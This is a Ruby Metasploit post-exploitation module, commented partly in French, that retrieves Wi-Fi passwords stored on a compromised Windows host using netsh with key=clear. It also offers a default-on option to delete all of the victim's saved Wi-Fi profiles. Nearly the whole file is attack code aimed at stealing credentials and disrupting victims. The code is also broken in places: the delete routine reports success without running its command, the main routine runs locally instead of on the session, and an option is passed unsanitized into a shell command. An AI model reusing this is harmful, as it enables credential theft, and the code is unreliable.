##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'wifi password stored on windows dumpper',
        'Description' => %q{
          get on or all wifi password stored on windows
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('NETWORK_NAME', [false, 'SSID of the access point to get', '']),
        OptBool.new('DELETE', [false, 'Delete all access points of the victim', true]),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
      ]
    )
  end

  def get_on_password() 
        cmd = "netsh wlan show profile #{datastore['NETWORK_NAME']} key=clear | findstr Contenu"
        print_status("retriving password for #{datastore['NETWORK_NAME']}...")
        print_good(session.shell_command_token(cmd))
  end 

  def delete_wifi_stored()
    print_status("deleting all access points saved into victim system...")
    cmd = "netsh wlan delete profile *"
    print_good("profiles deleted !")
  end

#   def run
#     # if datastore['NETWORK_NAME'] != '' then
#     #     get_on_password()
#     #     return
#     # end
    

#   end

def run
    print_status("Récupération des profils Wi-Fi enregistrés...")
  
    # Exécuter la commande PowerShell pour récupérer les profils Wi-Fi enregistrés
    output = `powershell -Command "netsh wlan show profiles | Select-String 'Tous les profils d'utilisateur' -Context 0,1 | ForEach-Object { $_ -replace '    Tous les profils d'utilisateur     : ', '' }"`
  
    # Diviser la sortie en lignes
    profiles = output.split("\n")
  
    # Pour chaque profil, récupérer les informations détaillées
    profiles.each do |profile|
      profile_name = profile.strip
  
      # Exécuter la commande PowerShell pour récupérer les informations détaillées du profil
      profile_details = `powershell -Command "netsh wlan show profile name=\\"#{profile_name}\\" key=clear"`.force_encoding(Encoding::UTF_8)
  
      # Extraire le mot de passe du profil
      password = profile_details.match(/Mot de passe de sécurité           : (.+)/)
  
      if password
        password = password[1].strip
      else
        password = "Non disponible"
      end
  
      print_good("Profil Wi-Fi : #{profile_name}, Mot de passe : #{password}")
    end
  end
  